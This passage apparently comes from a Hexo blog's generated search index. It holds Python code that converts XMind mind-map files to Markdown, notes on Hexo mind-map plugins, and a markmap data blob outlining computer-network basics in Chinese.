@classmethod    def parse(self, file_path):        file_content = self.__unzip(self, file_path)        file_json_content = self.__parse_json(file_content)        self.__parse_children(self, file_json_content)        self.__generat_file(self)    def __unzip(self, file_path):        with ZipFile(file_path) as xmind_file:            for f in xmind_file.namelist():                for key in self.xmindFileContent:                    if f == key:                        with xmind_file.open(f) as contentJsonFile:                            return contentJsonFile.read().decode(&#39;utf-8&#39;)    def __parse_json(file_content):        return json.loads(file_content)    def __parse_children(self, json_content):        root_topic = json_content[0][&quot;rootTopic&quot;]        cur_node = root_topic        self.__parse_node(self, cur_node, &quot;#&quot;)    &#39;&#39;&#39;    递归解析 children 节点    &#39;&#39;&#39;    def __parse_node(self, node, level):        self.markdown_file_content = self.markdown_file_content + &quot;\n&quot; + level + &quot; &quot; + node[&quot;title&quot;] + &quot;\n&quot;        if &quot;notes&quot; in node:            # TODO 内容 &quot;\n&quot; 需要替换为 &quot;  \n&quot;            content = node[&quot;notes&quot;][&quot;plain&quot;][&quot;content&quot;]            self.markdown_file_content = self.markdown_file_content + &quot;\n&quot; + node[&quot;notes&quot;][&quot;plain&quot;][&quot;content&quot;] + &quot;\n&quot;        if &quot;children&quot; in node:            for cur_node in node[&quot;children&quot;][&quot;attached&quot;]:                self.__parse_node(self, cur_node, level + &quot;#&quot;)    def __generat_file(self):        file = open(&#39;个人学习.md&#39;, &#39;w&#39;, encoding=&quot;utf-8&quot;)        file.write(&quot;[TOC]\n\n&quot; + self.markdown_file_content)        file.close()      </code></pre><h3 id="hexo思维导图展示"><a href="#hexo思维导图展示" class="headerlink" title="hexo思维导图展示"></a>hexo思维导图展示</h3><p>首先安装hexo-markmap 插件</p><p><code>npm install hexo-markmap </code></p><p>接着在思维导图文字内容的首部和末尾分别增加<br><code>&#123;% markmap 800px %&#125;``&#123;% endmarkmap %&#125;</code></p><h3 id="hexo的其他插件"><a href="#hexo的其他插件" class="headerlink" title="hexo的其他插件"></a>hexo的其他插件</h3><blockquote><p>hexo-tag-plugins</p></blockquote><p>使用该插件的<minmap>标签，使用方法（例）：</p><pre><code>&#123;% mindmap 600 %&#125;- 计算机网络概述-  计算机网络的基本概念- 以能够相互共享资源的方式互连起来的自治计算机系统的集合- 计算机网络的组成- 组成部分角度            - 硬件：主机（端系统）、通信链路（双绞线、光纤等）、交换设备（路由器、交换机等）、通信处理机（网卡等- 工作方式角度            - 核心部分：大量的网络和连接这些网络的路由器组成&#123;% endmindmap %&#125;</code></pre><p>与markmap的不同：高度单位不加px；使用缩进构成不同层级</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>计算机网络概述</title>
+      <link href="/knowledge/12.html"/>
+      <url>/knowledge/12.html</url>
+      
+        <content type="html"><![CDATA[<div class="markmap-container" style="height:800px">  <svg data="{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:1,&quot;p&quot;:{&quot;lines&quot;:[1,2]},&quot;v&quot;:&quot;计算机网络概述&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[3,4]},&quot;v&quot;:&quot;计算机网络的基本概念&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[5,6]},&quot;v&quot;:&quot;以能够相互共享资源的方式互连起来的自治计算机系统的集合&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[7,8]},&quot;v&quot;:&quot;自治：无主从关系&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[9,10]},&quot;v&quot;:&quot;互联：互联互通（通信链路、通过交换网络）&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[11,12]},&quot;v&quot;:&quot;计算机网络的组成&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[13,14]},&quot;v&quot;:&quot;组成部分角度&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[15,16]},&quot;v&quot;:&quot;硬件：主机（端系统）、通信链路（双绞线、光纤等）、交换设备（路由器、交换机等）、通信处理机（网卡等）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[17,18]},&quot;v&quot;:&quot;软件：网络操作系统、邮件收发程序、FTP程序、聊天程序等&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[19,20]},&quot;v&quot;:&quot;协议：计算机网络的核心，规定网络传输数据时所遵循和规范&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[21,22]},&quot;v&quot;:&quot;工作方式角度&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[23,24]},&quot;v&quot;:&quot;核心部分：大量的网络和连接这些网络的路由器组成&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[25,26]},&quot;v&quot;:&quot;边缘部分：所有连接到互联网上、供用户直接使用的主机&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[27,28]},&quot;v&quot;:&quot;功能组成角度&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[29,30]},&quot;v&quot;:&quot;通信子网：传输介质、通信设备、相应的网络协议&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[31,32]},&quot;v&quot;:&quot;资源子网：实现资源共享功能的设备及其软件的集合&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[33,34]},&quot;v&quot;:&quot;计算机网络的功能&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[35,36]},&quot;v&quot;:&quot;数据通信（最基本、最重要的功能）、资源共享、分布式处理、提高可靠性、负载均衡&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[37,38]},&quot;v&quot;:&quot;电子化办公服务、远程教育、娱乐等&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[39,40]},&quot;v&quot;:&quot;计算机网络的分类&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[41,42]},&quot;v&quot;:&quot;按分布范围&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[43,44]},&quot;v&quot;:&quot;广域网（WAN）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[45,46]},&quot;v&quot;:&quot;范围：提供长距离通信，几十千米到几千千米&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[47,48]},&quot;v&quot;:&quot;地位：因特网的核心部分&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[49,50]},&quot;v&quot;:&quot;技术：交换技术&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[51,52]},&quot;v&quot;:&quot;城域网（MAN）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[53,54]},&quot;v&quot;:&quot;范围：跨越几个街区甚至整个城市，5~50km&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[55,56]},&quot;v&quot;:&quot;技术：多采用以太网技术&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[57,58]},&quot;v&quot;:&quot;局域网（LAN）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[59,60]},&quot;v&quot;:&quot;范围：几十米到几千米的区域&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[61,62]},&quot;v&quot;:&quot;技术：广播技术&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[63,64]},&quot;v&quot;:&quot;个人局域网（PAN）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[65,66]},&quot;v&quot;:&quot;范围：个人工作地点将电子设备通过无线技术连接起来的网络，直径10m&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[67,68]},&quot;v&quot;:&quot;按传输技术&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[69,70]},&quot;v&quot;:&quot;广播式网络&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[71,72]},&quot;v&quot;:&quot;所有联网计算机共享一个公共通信信道（eg：大部分局域网、广域网中的无线和卫星通信网络）&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[73,74]},&quot;v&quot;:&quot;点对点网络&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[75,76]},&quot;v&quot;:&quot;每条物理线路连接一对计算机，采用分组存储转发和路由选择机制（eg：广域网基本使用点对点网络）&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[77,78]},&quot;v&quot;:&quot;按拓扑结构&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[79,80]},&quot;v&quot;:&quot;网络拓扑结构是由网中节点（路由器、主机等）与通信线路（网线）之间的几何关系，即主要取决于通信子网&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[81,82]},&quot;v&quot;:&quot;分类&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[83,84]},&quot;v&quot;:&quot;总线形&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[85,86]},&quot;v&quot;:&quot;用单根传输线把计算机连接起来&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[87,88]},&quot;v&quot;:&quot;优点：建网容易，增减节点方便，节省线路&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[89,90]},&quot;v&quot;:&quot;缺点：重负载时效率不高，总线任意一处对故障敏感&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[91,92]},&quot;v&quot;:&quot;星形&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[93,94]},&quot;v&quot;:&quot;每个终端都以单独的线路与中央设备相连&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[95,96]},&quot;v&quot;:&quot;优点：便于集中控制和处理&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[97,98]},&quot;v&quot;:&quot;缺点：成本高，中心设备对故障敏感&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[99,100]},&quot;v&quot;:&quot;环形&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[101,102]},&quot;v&quot;:&quot;所有计算机接口设备连接成一个环，环中信号单向传输（eg：令牌环局域网）&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[103,104]},&quot;v&quot;:&quot;网状&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[105,106]},&quot;v&quot;:&quot;一般情况下，每个节点至少有两条路径与其他节点相连（eg：多用在广域网）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[107,108]},&quot;v&quot;:&quot;优点：可靠性高&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[109,110]},&quot;v&quot;:&quot;缺点：控制复杂，线路成本高&quot;}]}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[111,112]},&quot;v&quot;:&quot;按使用者&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[113,114]},&quot;v&quot;:&quot;公用网&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[115,116]},&quot;v&quot;:&quot;专用网：为满足特殊业务需求而建造的网络&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[117,118]},&quot;v&quot;:&quot;按交换技术&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[119,120]},&quot;v&quot;:&quot;电路交换网络&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[121,122]},&quot;v&quot;:&quot;源节点和目的节点之间建立一条专用的通路，包括建立连接、传输数据、断开连接三个阶段&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[123,124]},&quot;v&quot;:&quot;优点：数据直接传送、延时小&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[125,126]},&quot;v&quot;:&quot;缺点：线路利用率低、不能充分利用线路容量、不便进行差错控制&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[127,128]},&quot;v&quot;:&quot;报文交换网络（存储转发网络）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[129,130]},&quot;v&quot;:&quot;用户数据加上源地址、目的地址、校验码等信息封装成报文并传送到相邻节点，全部存储后再转发给下一个节点&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[131,132]},&quot;v&quot;:&quot;优点：较为充分地利用线路容量，实现不同链路不同数据传输速率的转换、实现格式转换、实现一对一多对多的访问、实现差错控制&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[133,134]},&quot;v&quot;:&quot;缺点：增大了处理开销和存储资源的开销、增加了缓冲时延、缓冲区难以管理（报文大小不确定）、需要额外的控制机制使报文不乱序&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[135,136]},&quot;v&quot;:&quot;分组交换网络（包交换网络）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[137,138]},&quot;v&quot;:&quot;类似于报文交换网络，但是对数据进行了固定长度的分组&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[139,140]},&quot;v&quot;:&quot;优点（除报文交换的优点外）：缓冲易于管理、包的平均时延更小、网络占用的平均缓冲区更小、更易于标准化、更适合应用&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[141,142]},&quot;v&quot;:&quot;缺点：处理开销，存在失序、丢失或重复分组等问题、存在传输时延&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[143,144]},&quot;v&quot;:&quot;按传输介质&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[145,146]},&quot;v&quot;:&quot;有线网络（eg：双绞线，同轴电缆）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[147,148]},&quot;v&quot;:&quot;无线网络（eg：蓝牙、微波、无线电）&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[150,151]},&quot;v&quot;:&quot;计算机的性能指标&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[152,153]},&quot;v&quot;:&quot;带宽&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[154,155]},&quot;v&quot;:&quot;网络的通信线路所能传送数据的能力，单位：b/s&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[156,157]},&quot;v&quot;:&quot;时延&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[158,159]},&quot;v&quot;:&quot;发送时延（传输时延）：主机或路由器发送数据帧所需要的时间，发送时延=数据帧长度/信道宽度&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[160,161]},&quot;v&quot;:&quot;传播时延：电磁波在信道中传播一定距离所花费的时间，传播时延=信道长度/电磁波在信道上的传播速率&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[162,163]},&quot;v&quot;:&quot;处理时延：主机或路由器在收到分组后进行的分析分组首部、从分组提取数据部分等的处理时间&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[164,165]},&quot;v&quot;:&quot;排队时延：分组进入路由器后在输入队列排队等待以及确定转发接口后在输出队列排队等待的时间&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[166,167]},&quot;v&quot;:&quot;时延带宽积（以比特为单位的链路长度）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[168,169]},&quot;v&quot;:&quot;时延带宽积=传播时延*信道带宽，表示在连续发送数据的发送端第一个比特到达终点时发送端已经发送的数据量&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[170,171]},&quot;v&quot;:&quot;往返时延&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[172,173]},&quot;v&quot;:&quot;从发送数据到接收到接收端的确认这一过程经历的时间&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[174,175]},&quot;v&quot;:&quot;吞吐量&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[176,177]},&quot;v&quot;:&quot;单位时间内通过某个网络（或信道、接口）的数据量&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[178,179]},&quot;v&quot;:&quot;速率&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[180,181]},&quot;v&quot;:&quot;连接到计算机网络上的主机在数字信道上传送数据的速率，通常把最高的数据率称为带宽&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[182,183]},&quot;v&quot;:&quot;信道利用率&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[184,185]},&quot;v&quot;:&quot;某一信道有百分之多少的时间是有数据通过的&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:2,&quot;p&quot;:{&quot;lines&quot;:[186,187]},&quot;v&quot;:&quot;计算机体系结构与参考模型&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[188,189]},&quot;v&quot;:&quot;协议、服务和接口的概念&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[190,191]},&quot;v&quot;:&quot;协议&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[192,193]},&quot;v&quot;:&quot;控制两个或多个对等实体进行通信的规则的集合，是水平的&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[194,195]},&quot;v&quot;:&quot;组成&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[196,197]},&quot;v&quot;:&quot;语法：规定数据的传输格式&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[198,199]},&quot;v&quot;:&quot;语义：规定了所要完成的功能&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[200,201]},&quot;v&quot;:&quot;同步：规定了执行各种操作的条件、时序关系等&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[202,203]},&quot;v&quot;:&quot;一个完整的协议通常有线路管理（建立、释放连接）、差错控制、数据转换等功能 &quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[204,205]},&quot;v&quot;:&quot;接口&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[206,207]},&quot;v&quot;:&quot;同一结点内相邻两层交换信息的连接点，是一个系统的内部规定&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[208,209]},&quot;v&quot;:&quot;同一结点相邻两层的实体通过服务访问点（Service Access Point, SAP）进行交互（SAP实际上是逻辑接口）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[210,211]},&quot;v&quot;:&quot;物理层：网卡接口&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[212,213]},&quot;v&quot;:&quot;数据链路层：MAC地址（物理地址）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[214,215]},&quot;v&quot;:&quot;网络层：IP地址（网络地址）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[216,217]},&quot;v&quot;:&quot;传输层：端口号&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[218,219]},&quot;v&quot;:&quot;应用层：用户界面&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[220,221]},&quot;v&quot;:&quot;服务&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[222,223]},&quot;v&quot;:&quot;指下层为紧邻的上层提供的功能调用，是垂直的&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[224,225]},&quot;v&quot;:&quot;在一层内完成的全部功能并非都称为服务，只有那些能够被高一层实体“看得见”的功能才能称为服务&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[226,227]},&quot;v&quot;:&quot;OSI七层参考模型&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[228,229]},&quot;v&quot;:&quot;目的&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[230,231]},&quot;v&quot;:&quot;支持异构网络的互联互通&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[232,233]},&quot;v&quot;:&quot;产生在协议发明之前，没有偏向任何特定的协议&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[234,235]},&quot;v&quot;:&quot;层次&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[236,237]},&quot;v&quot;:&quot;资源子网&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[238,239]},&quot;v&quot;:&quot;应用层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[244,245]},&quot;v&quot;:&quot;表示层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[250,251]},&quot;v&quot;:&quot;会话层&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[256,257]},&quot;v&quot;:&quot;传输层（承上启下）&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[258,259]},&quot;v&quot;:&quot;负责主机中两个进程之间的通信&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[260,261]},&quot;v&quot;:&quot;传输单位：报文段（TCP）或用户数据报（UDP）&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[262,263]},&quot;v&quot;:&quot;功能：为端到端连接提供可靠的传输服务、流量控制、差错控制、服务质量、数据传输管理等&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[264,265]},&quot;v&quot;:&quot;典型协议：TCP、UDP&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[266,267]},&quot;v&quot;:&quot;通信子网&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[268,269]},&quot;v&quot;:&quot;网络层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[278,279]},&quot;v&quot;:&quot;数据链路层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[286,287]},&quot;v&quot;:&quot;物理层&quot;}]}]}]},{&quot;t&quot;:&quot;heading&quot;,&q